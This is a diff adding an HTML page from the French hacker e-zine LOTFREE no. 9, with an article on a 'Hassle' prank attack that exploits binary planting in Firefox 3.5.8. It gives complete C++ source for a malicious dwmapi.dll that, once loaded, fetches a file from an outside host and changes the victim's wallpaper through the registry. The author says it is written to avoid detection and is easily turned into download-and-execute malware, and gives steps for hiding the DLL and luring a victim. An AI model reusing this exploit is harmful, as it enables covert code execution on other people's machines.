@@ -1,0 +1,142 @@
+<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Strict//EN"
+	"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd">
+<html xmlns="http://www.w3.org/1999/xhtml" xml:lang="en">
+  <head>
+    <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
+    <title>LOTFREE9</title>
+    <link rel="stylesheet" type="text/css" href="style.css">
+    <link href="css/shCore.css" rel="stylesheet" type="text/css" />
+    <link href="css/shThemeDefault.css" rel="stylesheet" type="text/css" />
+  </head>
+
+  <body>
+    <div id="head">LOTFREE Magazine numéro 9</div>
+    <div id="foot"><span style="float: left;"><br />Lancez la radio, cliquez ici : </span><a href="#" onclick="window.open('player.html', 'Player', 'toolbar=0,status=0,location=0,menubar=0,resizable=0,width=175,height=35')"><img src="icon.png" /></a></div>
+    <div id="left">
+      <dl>
+        <dt><strong>Welcome to your inbox Hacker !</strong></dt>
+        <dd>Directories :</dd>
+        <dt><a id="inbox" class="nav" href="inbox.html"> Inbox</a></dt>
+        <dd>One for the money</dd>
+        <dt><a id="drafts" class="nav" href="drafts.html">Drafts</a></dt>
+        <dd>Two for the show</dd>
+        <dt><a id="sent" class="nav" href="sent.html">Sent</a></dt>
+        <dd>Three to get ready</dd>
+        <dt><a id="spam" class="nav" href="spam.html">Spam</a></dt>
+        <dd>And four to go</dd>
+        <dt><a id="trash" class="nav" href="trash.html">Trash</a></dt>
+        <dd>Enjoy ;-)</dd>
+      </dl>
+    </div>
+
+    <div id="content">
+    <p><strong>Attaque Hassle via l'exploitation du binary planting</strong></p>
+
+    <p>Sur ce grand cyber-merdier qu'est le web il a eu et il y aura encore des mèmes, phénomènes Internet &amp; co dont le but et de vous prendre par surprise pour vous informer que vous vous êtes fait avoir :p</p>
+
+    <p>Les anciens se souviendront du fameux &quot;cyber-doigt dans le cul&quot; mais on citera aussi le <em>rickrolling</em>, <em>goatse</em> ou la vidéo tranquille qui se termine par un visage défiguré qui hurle dans les hauts parleurs. Mais selon moi, rien ne laisse psychologiquement plus de marque qu'une hassle attack.</p>
+
+    <p>Le mot anglais <em>hassle</em> est un synomyme de <em>harass</em> (harceler), mais en fait la <em>hassle attack</em> vient du nom de <em>David Hasselhoff</em> : Quoi de plus humiliant que de ce retrouver face à face à la virilité plus que débordante de l'ancien sauveteur de <em>Malibu</em> ?</p>
+
+    <p>Conneries mis à part, c'est surtout l'occasion de vous montrer un cas concret de l'exploitation des failles de type binary planting car les exploits existants se cantonnent à afficher des MessageBox. Ici on va créer une DLL malicieuse qui exploitera une faille dans une ancienne version de Firefox. On a testé avec la version 3.5.8 qui est récupérable <a href="http://www.oldapps.com/firefox.php?old_firefox=75">sur oldapps.com</a></p>
+
+    <p>Je n'entre pas dans les détails de la recherche de ces failles qui a déjà été traité par <em>storm</em> dans le magazine <a href="http://dl.packetstormsecurity.net/mag/gny/gnyzine-02.txt">Go Null Yourself</a>. Je précise simplement que la compilation des exploits que l'on trouve sur le web échouera (ne donnera pas le dll valide pour l'exploitation) avec un compilateur C++ comme Visual Studio car le nom des fonctions exportées ne sera pas celui attendu. Pour que cela marche il faudra aussi rajouter la directive <em>extern &quot;C&quot;</em>. Vous pouvez utiliser <a href="http://www.nirsoft.net/utils/dll_export_viewer.html">DLL Export Viewer</a> pour obtenir le nom des fonctions qu'un fichier DLL exporte.</p>
+
+    <p>Que fait notre evil DLL qui suit ? Elle télécharge sur le web un image BMP de <em>David Hasselhoff</em> dans ses plus beaux atours et défini cette image en fond d'écran. Elle la rajoute aussi dans la base de registre. Bien sûr c'est un exemple pour le lulz mais qui peut être facilement modifié pour du download and execute d'un malware quelconque ;-)</p>
+
+<pre class="brush: cpp">/* LOTFREE Hassle exploit pour firefox 3.5.8 - dll a nommer dwmapi.dll */
+#include &lt;windows.h&gt;
+/* Pour les fonctions InternetOpen*
+ * On n'utilise pas URLDownloadToFile
+ * qui necessite urlmon.dll et est generalement
+ * utilise dans les shellcodes et droppers
+ * donc suspicieux.
+ */
+#include &lt;wininet.h&gt;
+
+#define DllExport extern &quot;C&quot; __declspec (dllexport)
+
+int pwn()
+{
+    HKEY handle;
+    DWORD dwDisp;
+    HINTERNET hnet;
+    HINTERNET hurl;
+    char buffer[4096];
+    DWORD dwRead = 0, dwWrite;
+    HANDLE fichier;
+    wchar_t image[] = L&quot;http://www.4everload.com/index.php/Images/Large/c04dae705525/David_Hasselhoff.bmp&quot;;
+    wchar_t tempdir[255];
+
+    GetTempPathW(245, tempdir);
+    wcscat(tempdir, L&quot;img.bmp&quot;);
+
+
+    hnet = InternetOpenW(L&quot;Mozilla&quot;, INTERNET_OPEN_TYPE_PRECONFIG, NULL, NULL, 0);
+    hurl = InternetOpenUrlW(hnet,
+                            image,
+                            NULL,
+                            0,
+                            0,
+                            0);
+    fichier = CreateFileW(tempdir, GENERIC_WRITE, 0, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
+    while(InternetReadFile(hurl, buffer, 4096, &amp;dwRead))
+    {
+        if(dwRead == 0) break;
+        WriteFile(fichier, buffer, dwRead, &amp;dwWrite, NULL);
+    }
+    CloseHandle(fichier);
+    InternetCloseHandle(hurl);
+    InternetCloseHandle(hnet);
+
+    RegCreateKeyExW(HKEY_CURRENT_USER,
+                       L&quot;Control Panel\\Desktop\\Wallpaper&quot;,
+                       0,
+                       NULL,
+                       0,
+                       KEY_ALL_ACCESS,
+                       NULL,
+                       &amp;handle,
+                       &amp;dwDisp);
+    RegSetValueExW(handle, L&quot;Wallpaper&quot;, 0, REG_SZ, (LPBYTE)tempdir, wcslen(tempdir)*sizeof(wchar_t));
+    RegCloseKey(handle);
+
+    SystemParametersInfoW(SPI_SETDESKWALLPAPER, 0, (PVOID)tempdir, SPIF_UPDATEINIFILE|SPIF_SENDCHANGE);
+    return 0;
+}
+
+DWORD WINAPI ThreadProc(LPVOID lpParameter)
+{
+        pwn();
+        return 0;
+}
+
+DllExport void DwmIsCompositionEnabled() {
+    /*
+    Via http://msdn.microsoft.com/en-us/library/windows/desktop/aa385098(v=VS.85).aspx
+    La doc de InternetOpen* indique :
+    Like all other aspects of the WinINet API, this function cannot be safely
+    called from within DllMain or the constructors and destructors of global objects.
+    Du coup on fait appel a un thread pour passer outre.
+    */
+    CreateThread(NULL, NULL, ThreadProc, NULL, NULL, NULL);
+    return;
+}
+
+
+BOOL WINAPI DllMain(HINSTANCE hinstDLL, DWORD fdwReason, LPVOID lpvReserved)
+{
+    return 0;
+}
+</pre>
+
+<p>Il ne reste plus qu'à placer la DLL compilée dans un dossier sous le nom dwmapi.dll. Donner l'attribut caché au fichier puis placer un fichier .html dans le même dossier. Faire ensuite en sorte q'une personne avec un Firefox vulnérable ouvre le fichier et rigoler un bon coup :)<br />
+Source + DLL dans <a href="../data/dll_hijack/">data/dll_hijack</a></p>
+    </div>
+<script language="javascript" src="js/shCore.js"></script>
+<script language="javascript" src="js/shBrushCpp.js"></script>
+<script type="text/javascript">
+  SyntaxHighlighter.all()
+</script>
+  </body>
+</html>
